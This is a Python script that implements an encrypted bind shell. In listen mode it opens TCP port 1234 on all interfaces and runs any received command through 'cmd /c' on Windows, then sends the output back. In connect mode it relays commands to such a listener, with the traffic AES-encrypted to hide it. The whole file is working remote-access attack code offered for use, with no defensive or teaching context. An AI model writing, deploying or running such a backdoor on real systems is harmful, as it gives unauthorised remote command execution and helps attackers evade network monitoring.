import socket, subprocess, threading, argparse

# Encryption
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

DEFAULT_PORT = 1234
MAX_BUFFER = 4096

class AESCipher:
    def __init__(self, key=None):
        # Initialize AESCipher with a random key if not provided
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)
    
    def encrypt(self, plaintext):
        # Encrypt plaintext using AES encryption with ECB mode
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()
    
    def decrypt(self, encrypted):
        # Decrypt encrypted data
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)
    
    def __str__(self):
        # Return string representation of the key
        return "Key: {}".format(self.key.hex())

# Function to send encrypted data
def encrypted_send(s, msg):
    s.send(cipher.encrypt(msg).encode("latin-1"))

# Function to execute shell commands
def execute_cmd(cmd):
    try:
        # Execute the command and capture the output
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        # Handle command execution errors
        output = b"Command failed"
    return output

# Function to decode and strip received data
def decode_and_strip(s):
    return s.decode("latin-1").strip()

# Thread function for shell interaction
def shell_thread(s):
    encrypted_send(s, b"Connected to bind shell")
    try:
        while True:
            # Receive command from the client
            encrypted_send(s, b"\r\nEnter command: ")
            data = s.recv(MAX_BUFFER)
            if data:
                # Decrypt and decode the received data
                buffer = cipher.decrypt(decode_and_strip(data))
                buffer = decode_and_strip(buffer)
                if not buffer or buffer == "exit":
                    # Close the connection if the client sends exit command
                    s.close()
                    exit()
            print("Executing command: '{}'".format(buffer))
            # Execute the command and send back the output
            encrypted_send(s, execute_cmd(buffer))
    except:
        s.close()
        exit()

# Thread function for sending data
def send_thread(s):
    try:
        while True:
            # Get user input and send it to the server
            data = input() + "\n"
            encrypted_send(s, data.encode("latin-1"))
    except:
        s.close()
        exit()

# Thread function for receiving data
def recv_thread(s):
    try:
        while True:
            # Receive and print data from the server
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                data = cipher.decrypt(data).decode("latin-1")
                print(data, end="", flush=True)
    except:
        s.close()
        exit()

# Function to set up a bind shell server
def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()
    print("Starting bind shell")
    while True:
        # Accept incoming client connections
        client_socket, addr = s.accept()
        print("New user connected")
        # Start a new thread to handle the client connection
        threading.Thread(target=shell_thread, args=(client_socket, )).start()

# Function to connect to a bind shell server
def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))
    print("Connecting to bind shell")
    # Start separate threads for sending and receiving data
    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()

# Argument parsing
parser = argparse.ArgumentParser()
parser.add_argument("-l", "--listen", action="store_true", help="Setup bind shell", required=False)
parser.add_argument("-c", "--connect", help="Connect to bind shell", required=False)
parser.add_argument("-k", "--key", help="Encryption key", type=str, required=False)
args = parser.parse_args()

if args.connect and not args.key:
    parser.error("-c CONNECT requires -k KEY")

# Create AESCipher object with the provided key or a random key
if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher()

print(cipher)

if args.listen:
    # Start the bind shell server
    server()
elif args.connect:
    # Connect to the bind shell server
    client(args.connect)
